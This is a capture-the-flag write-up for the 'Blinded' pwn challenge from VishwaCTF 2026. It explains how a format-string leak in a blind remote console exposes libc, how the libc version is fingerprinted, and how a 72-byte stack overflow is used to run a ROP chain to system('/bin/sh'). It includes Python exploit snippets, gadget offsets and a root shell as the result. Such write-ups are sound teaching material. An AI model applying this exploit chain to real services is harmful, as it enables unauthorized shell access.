# Blinded - VishwaCTF 2026 (PWN)

## TL;DR
Blind binary (no source/binary provided, only libc). Format string in option 1 leaks libc base. Buffer overflow in option 2 (72-byte buffer, no canary) gives ROP to `system("/bin/sh")`.

## Flag
```
VishwaCTF{adm1n_c0ns0le_0v3rr1d3_09b0c012}
```

## Challenge Description
> The Admin Console is exposed over a remote socket, but the binary is withheld. Leak what you need from the blind logger and take over the console before access is revoked.

- **Remote**: `212.2.248.184:31451`
- **Files provided**: `libc.so` (Debian GLIBC 2.34), `libc_correct.so` (Ubuntu GLIBC 2.39)
- **No binary** provided — fully blind exploitation

## Reconnaissance

Connecting to the service reveals a simple menu:

```
=== Admin Console ===
1. Log a note
2. Enter secret info
3. Exit
```

Behavior per option:
| Option | Prompt | Echo? | Notes |
|--------|--------|-------|-------|
| 1 | `Log a note:` | Yes — prints input back | Format string candidate |
| 2 | `Enter your secret info:` | No | Buffer overflow candidate |
| 3 | (none) | Connection closes | Clean exit |

## Vulnerability Discovery

### 1. Format String (Option 1)

Sending `%p.%p.%p.%p.%p.%p.%p.%p` to option 1 returns:

```
(nil).(nil).(nil).0x1.0x7f...740.0x7fff...c9.0x7f...8e0.0x70252e70252e7025
```

- Positions 1-5: register args (rsi, rdx, rcx, r8, r9)
- Position 6+: stack values
- Position 8+: our input reflected on stack → classic `printf(user_input)` format string

### 2. Buffer Overflow (Option 2)

Binary search for crash boundary by sending increasing lengths:

```
71 bytes: ALIVE (consistently)
72 bytes: CRASH (consistently)
```

The input function waits for a newline → `gets()` or `fgets()`. Since `gets()` stores N chars + `\0`, sending 72 'A's stores 73 bytes. The null terminator at byte 72 corrupts the return address → crash.

**No stack canary**: If a canary existed at, say, offset 64, then 65+ bytes would corrupt it and crash. Since 71 bytes (71 chars + null at byte 71) is alive, there is no canary before the return address.

**No `leave` epilogue**: If the function used `leave; ret`, corrupting the saved rbp (bytes 64-71 when sending 71 chars) would crash because `leave` = `mov rsp, rbp; pop rbp` and a corrupted rbp would segfault. Since 71 bytes is alive, the epilogue uses `add rsp, N; ret` (no rbp dereference).

**Conclusion**: 72-byte flat buffer, return address immediately at offset 72.

## Identifying the Correct Libc

Two libc files provided — which is on the server? Compare the difference between two leaked addresses within the same connection:

```
%7$p  → _IO_2_1_stdin_ 
%35$p → __libc_start_call_main return address (after call *%rax at 0x2a1c8)
```

| Libc | `_IO_2_1_stdin_` | `__libc_start_call_main` ret | Expected diff |
|------|------------------|------------------------------|---------------|
| libc_correct.so (2.39) | 0x2038e0 | 0x2a1ca | 0x1D9716 |
| libc.so (2.34) | 0x1f4a80 | 0x2d1ca | 0x1C78B6 |

Measured diff from leaks: **0x1D9716** → matches `libc_correct.so`. Confirmed by cross-verifying: `libc_base + 0x2038e0 == leaked_stdin` on every run.

## Exploit

### Step 1: Leak libc base

```python
r.sendline(b'1')                    # Option 1: Log a note
r.sendline(b'%7$p|%35$p')           # Leak stdin + libc_start_call_main ret

libc_base = leaked_pos35 - 0x2a1ca  # Compute base
assert libc_base + 0x2038e0 == leaked_pos7   # Verify
```

### Step 2: ROP via buffer overflow

```python
r.sendline(b'2')                    # Option 2: Enter secret info

payload  = b'A' * 72                # Fill 72-byte buffer
payload += p64(libc_base + 0x2882f)    # ret (16-byte stack alignment for system)
payload += p64(libc_base + 0x10f78b)   # pop rdi; ret
payload += p64(libc_base + 0x1cb42f)   # "/bin/sh"
payload += p64(libc_base + 0x58750)    # system()

r.send(payload + b'\n')             # gets() terminates at newline
# Shell is now active — function returned into our ROP chain
```

The function returns immediately after `gets()`, so the ROP chain fires as soon as the payload is sent. No need to trigger exit.

### Key Offsets (libc_correct.so, Ubuntu GLIBC 2.39)

| Symbol | Offset |
|--------|--------|
| `__libc_start_call_main` ret | 0x2a1ca |
| `_IO_2_1_stdin_` | 0x2038e0 |
| `system` | 0x58750 |
| `/bin/sh` | 0x1cb42f |
| `pop rdi; ret` | 0x10f78b |
| `ret` (alignment) | 0x2882f |

## Result

```
$ id
uid=0(root) gid=0(root) groups=0(root)
$ cat flag*
VishwaCTF{adm1n_c0ns0le_0v3rr1d3_09b0c012}
```

## Key Lessons

1. **Blind overflow offset**: binary search crash boundary to find exact ret offset without having the binary
2. **Canary detection**: if overwriting bytes 65-71 doesn't crash, there's no canary between buffer and ret
3. **Epilogue detection**: if corrupting saved rbp doesn't crash, function uses `add rsp` not `leave`
4. **Libc fingerprinting**: compute difference between two known symbols and compare against candidate libcs
5. **Stack alignment**: `system()` on glibc 2.39 requires 16-byte aligned RSP — extra `ret` gadget before the chain
